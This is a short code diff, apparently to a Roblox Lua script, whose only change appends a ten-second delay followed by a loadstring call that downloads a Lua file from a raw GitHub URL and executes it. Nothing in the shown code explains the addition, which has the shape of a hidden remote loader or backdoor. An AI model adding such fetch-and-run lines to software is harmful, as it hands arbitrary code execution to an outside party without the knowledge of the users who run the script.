@@ -99,3 +99,7 @@ e1_002.RenderStepped:Connect(function()
         end
     end
 end)
+
+wait(10)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/triple7distro/triple7/refs/heads/main/ee/error.lua"))()
